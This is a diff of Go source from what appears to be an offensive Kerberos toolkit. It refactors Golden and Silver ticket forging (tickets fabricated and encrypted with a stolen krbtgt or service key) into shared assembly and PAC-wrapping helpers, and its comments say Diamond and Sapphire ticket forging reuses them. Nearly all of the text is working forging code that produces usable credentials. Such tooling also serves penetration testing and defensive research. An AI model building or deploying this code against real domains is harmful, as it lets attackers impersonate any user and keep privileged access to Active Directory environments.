@@ -30,9 +30,12 @@ import (
 // 2.8). For a golden ticket the "server" is krbtgt, so both signatures use the
 // krbtgt key; for a silver ticket both use the service key (the holder never
 // contacts the KDC, and services do not verify the KDC signature by default).
-// Diamond and sapphire tickets — which re-use a legitimately issued PAC and so
-// require NDR-decoding an existing KERB_VALIDATION_INFO — are intentionally out
-// of scope here and tracked separately.
+//
+// Diamond and sapphire tickets — which re-use a legitimately issued PAC instead
+// of a fully fabricated one — build on the same primitives and live in
+// diamond_sapphire.go: they NDR-decode an existing KERB_VALIDATION_INFO (via the
+// pac package) rather than assembling one from scratch, then re-sign with the
+// helpers here.
 
 // AD-type numbers ([MS-KILE] 3.4.5.3 / RFC 4120 5.2.6) for embedding the PAC.
 const (
@@ -191,34 +194,74 @@ func forge(opts ForgeOptions, sname messages.PrincipalName, srealm string, golde
 		NameString: []string{opts.Username},
 	}
 
-	// Ticket flags: forwardable + renewable + pre-authent (+ initial for a TGT).
-	flagBits := []int{
-		messages.TicketFlagForwardable,
-		messages.TicketFlagRenewable,
-		messages.TicketFlagPreAuthent,
-	}
-	if golden {
-		flagBits = append(flagBits, messages.TicketFlagInitial)
-	}
-	flags := messages.NewKerberosFlags(flagBits...)
-
 	// Build, sign, and embed the PAC.
 	authData, err := buildPACAuthData(&opts, start)
 	if err != nil {
 		return nil, err
 	}
 
+	return assembleForgedTicket(assembleParams{
+		SName:        sname,
+		SRealm:       srealm,
+		CName:        cname,
+		Initial:      golden,
+		AuthData:     authData,
+		Key:          opts.Key,
+		KeyEType:     opts.KeyEType,
+		KvNo:         opts.KvNo,
+		SessionKey:   sessionKey,
+		SessionEType: sessionEType,
+		StartTime:    start,
+		EndTime:      end,
+		RenewTill:    renew,
+	})
+}
+
+// assembleParams gathers the inputs assembleForgedTicket needs to build, encrypt,
+// and package a ticket from an already-built authorization-data (PAC) element.
+type assembleParams struct {
+	SName        messages.PrincipalName
+	SRealm       string
+	CName        messages.PrincipalName
+	Initial      bool // set the initial (AS-issued) ticket flag, i.e. a forged TGT
+	AuthData     []messages.AuthorizationData
+	Key          []byte // service/krbtgt key encrypting the enc-part
+	KeyEType     int
+	KvNo         int
+	SessionKey   []byte
+	SessionEType int
+	StartTime    time.Time
+	EndTime      time.Time
+	RenewTill    time.Time
+}
+
+// assembleForgedTicket builds the EncTicketPart, encrypts it with the supplied
+// key (ticket key usage 2), and returns a ForgedTicket with the matching
+// KrbCredInfo. It is the shared assembly tail for golden/silver forging and for
+// the sapphire graft (which supplies a genuine, re-signed PAC as AuthData).
+func assembleForgedTicket(p assembleParams) (*ForgedTicket, error) {
+	// Ticket flags: forwardable + renewable + pre-authent (+ initial for a TGT).
+	flagBits := []int{
+		messages.TicketFlagForwardable,
+		messages.TicketFlagRenewable,
+		messages.TicketFlagPreAuthent,
+	}
+	if p.Initial {
+		flagBits = append(flagBits, messages.TicketFlagInitial)
+	}
+	flags := messages.NewKerberosFlags(flagBits...)
+
 	encPart := messages.EncTicketPart{
 		Flags:             flags,
-		Key:               messages.EncryptionKey{KeyType: sessionEType, KeyValue: sessionKey},
-		CRealm:            srealm,
-		CName:             cname,
+		Key:               messages.EncryptionKey{KeyType: p.SessionEType, KeyValue: p.SessionKey},
+		CRealm:            p.SRealm,
+		CName:             p.CName,
 		Transited:         messages.TransitedEncoding{TRType: 0, Contents: []byte{}},
-		AuthTime:          start,
-		StartTime:         start,
-		EndTime:           end,
-		RenewTill:         renew,
-		AuthorizationData: authData,
+		AuthTime:          p.StartTime,
+		StartTime:         p.StartTime,
+		EndTime:           p.EndTime,
+		RenewTill:         p.RenewTill,
+		AuthorizationData: p.AuthData,
 	}
 	encBytes, err := encPart.Marshal()
 	if err != nil {
@@ -226,16 +269,16 @@ func forge(opts ForgeOptions, sname messages.PrincipalName, srealm string, golde
 	}
 
 	// Encrypt the enc-part with the service/krbtgt key (ticket key usage 2).
-	cipher, err := kerbcrypto.Encrypt(opts.KeyEType, opts.Key, kerbcrypto.KeyUsageKDCRepTicket, encBytes)
+	cipher, err := kerbcrypto.Encrypt(p.KeyEType, p.Key, kerbcrypto.KeyUsageKDCRepTicket, encBytes)
 	if err != nil {
 		return nil, fmt.Errorf("kerberos: encrypt ticket enc-part: %w", err)
 	}
 
 	ticket := messages.Ticket{
 		TktVno:  messages.KerberosV5,
-		Realm:   srealm,
-		SName:   sname,
-		EncPart: messages.EncryptedData{EType: opts.KeyEType, KvNo: opts.KvNo, Cipher: cipher},
+		Realm:   p.SRealm,
+		SName:   p.SName,
+		EncPart: messages.EncryptedData{EType: p.KeyEType, KvNo: p.KvNo, Cipher: cipher},
 	}
 	ticketRaw, err := ticket.Marshal()
 	if err != nil {
@@ -243,24 +286,24 @@ func forge(opts ForgeOptions, sname messages.PrincipalName, srealm string, golde
 	}
 
 	credInfo := messages.KrbCredInfo{
-		Key:       messages.EncryptionKey{KeyType: sessionEType, KeyValue: sessionKey},
-		PRealm:    srealm,
-		PName:     cname,
+		Key:       messages.EncryptionKey{KeyType: p.SessionEType, KeyValue: p.SessionKey},
+		PRealm:    p.SRealm,
+		PName:     p.CName,
 		Flags:     flags,
-		AuthTime:  start,
-		StartTime: start,
-		EndTime:   end,
-		RenewTill: renew,
-		SRealm:    srealm,
-		SName:     sname,
+		AuthTime:  p.StartTime,
+		StartTime: p.StartTime,
+		EndTime:   p.EndTime,
+		RenewTill: p.RenewTill,
+		SRealm:    p.SRealm,
+		SName:     p.SName,
 	}
 
 	return &ForgedTicket{
 		Ticket:       ticket,
 		TicketRaw:    ticketRaw,
 		CredInfo:     credInfo,
-		SessionKey:   sessionKey,
-		SessionEType: sessionEType,
+		SessionKey:   p.SessionKey,
+		SessionEType: p.SessionEType,
 	}, nil
 }
 
@@ -316,8 +359,14 @@ func buildPACAuthData(opts *ForgeOptions, authTime time.Time) ([]messages.Author
 	if err != nil {
 		return nil, fmt.Errorf("kerberos: sign PAC: %w", err)
 	}
+	return wrapPACInAuthData(pacBytes)
+}
 
-	// AD-WIN2K-PAC element, then wrap in AD-IF-RELEVANT.
+// wrapPACInAuthData wraps a marshaled PAC in the AD-WIN2K-PAC → AD-IF-RELEVANT
+// authorization-data nesting expected in a ticket enc-part ([MS-KILE] 3.4.5.3).
+// It is the inverse of extractWin2KPAC and is shared by golden/silver forging,
+// diamond re-signing, and the sapphire graft.
+func wrapPACInAuthData(pacBytes []byte) ([]messages.AuthorizationData, error) {
 	innerDER, err := asn1.Marshal([]messages.AuthorizationData{
 		{ADType: adTypeWin2KPAC, ADData: pacBytes},
 	})
